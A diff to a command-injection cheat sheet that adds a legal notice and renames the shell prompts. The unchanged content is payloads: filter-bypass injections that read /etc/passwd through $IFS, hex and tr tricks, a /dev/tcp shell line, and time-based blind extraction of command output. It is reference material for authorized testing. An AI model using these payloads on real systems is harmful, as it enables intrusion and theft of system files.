@@ -1,5 +1,9 @@
 # Command Injection
 
+> **Legal Notice:** This document is for authorized security testing and educational purposes only. Only test against systems you own or have explicit written permission to assess. Unauthorized testing is illegal under the CFAA, UK Computer Misuse Act, and equivalent laws. **Obtain written scope authorization before testing.**
+
+---
+
 > Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
 
 ## Summary
@@ -68,26 +72,26 @@ original_cmd_by_server $(cat /etc/passwd)
 Works on Linux only.
 
 ```powershell
-swissky@crashlab:~/Www$ cat</etc/passwd
+user@lab:~/www$ cat</etc/passwd
 root:x:0:0:root:/root:/bin/bash
 
-swissky@crashlab▸ ~ ▸ $ {cat,/etc/passwd}
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-
-swissky@crashlab▸ ~ ▸ $ cat$IFS/etc/passwd
+user@lab:~$ {cat,/etc/passwd}
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 
-swissky@crashlab▸ ~ ▸ $ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+user@lab:~$ cat$IFS/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+user@lab:~$ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
 RCE
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 
-swissky@crashlab▸ ~ ▸ $ X=$'uname\x20-a'&&$X
-Linux crashlab 4.4.X-XX-generic #72-Ubuntu
+user@lab:~$ X=$'uname\x20-a'&&$X
+Linux lab 4.4.X-XX-generic #72-Ubuntu
 
-swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
+user@lab:~$ sh</dev/tcp/127.0.0.1/4242
 ```
 
 Commands execution without spaces, $ or { } - Linux (Bash only)
@@ -114,28 +118,28 @@ something%0Acat%20/etc/passwd
 Linux
 
 ```powershell
-swissky@crashlab▸ ~ ▸ $ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+user@lab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 /etc/passwd
 
-swissky@crashlab▸ ~ ▸ $ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+user@lab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
 root:x:0:0:root:/root:/bin/bash
 
-swissky@crashlab▸ ~ ▸ $ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+user@lab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
 root:x:0:0:root:/root:/bin/bash
 
-swissky@crashlab▸ ~ ▸ $ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+user@lab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
 root:x:0:0:root:/root:/bin/bash
 
-swissky@crashlab▸ ~ ▸ $ xxd -r -p <<< 2f6574632f706173737764
+user@lab:~$ xxd -r -p <<< 2f6574632f706173737764
 /etc/passwd
 
-swissky@crashlab▸ ~ ▸ $ cat `xxd -r -p <<< 2f6574632f706173737764`
+user@lab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
 root:x:0:0:root:/root:/bin/bash
 
-swissky@crashlab▸ ~ ▸ $ xxd -r -ps <(echo 2f6574632f706173737764)
+user@lab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
 /etc/passwd
 
-swissky@crashlab▸ ~ ▸ $ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+user@lab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 root:x:0:0:root:/root:/bin/bash
 ```
 
@@ -144,19 +148,19 @@ root:x:0:0:root:/root:/bin/bash
 Commands execution without backslash and slash - linux bash
 
 ```powershell
-swissky@crashlab▸ ~ ▸ $ echo ${HOME:0:1}
+user@lab:~$ echo ${HOME:0:1}
 /
 
-swissky@crashlab▸ ~ ▸ $ cat ${HOME:0:1}etc${HOME:0:1}passwd
+user@lab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
 root:x:0:0:root:/root:/bin/bash
 
-swissky@crashlab▸ ~ ▸ $ echo . | tr '!-0' '"-1'
+user@lab:~$ echo . | tr '!-0' '"-1'
 /
 
-swissky@crashlab▸ ~ ▸ $ tr '!-0' '"-1' <<< .
+user@lab:~$ tr '!-0' '"-1' <<< .
 /
 
-swissky@crashlab▸ ~ ▸ $ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+user@lab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 root:x:0:0:root:/root:/bin/bash
 ```
 
@@ -221,12 +225,12 @@ g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 Extracting data : char by char
 
 ```powershell
-swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+user@lab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 real    0m5.007s
 user    0m0.000s
 sys 0m0.000s
 
-swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+user@lab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
 real    0m0.002s
 user    0m0.000s
 sys 0m0.000s
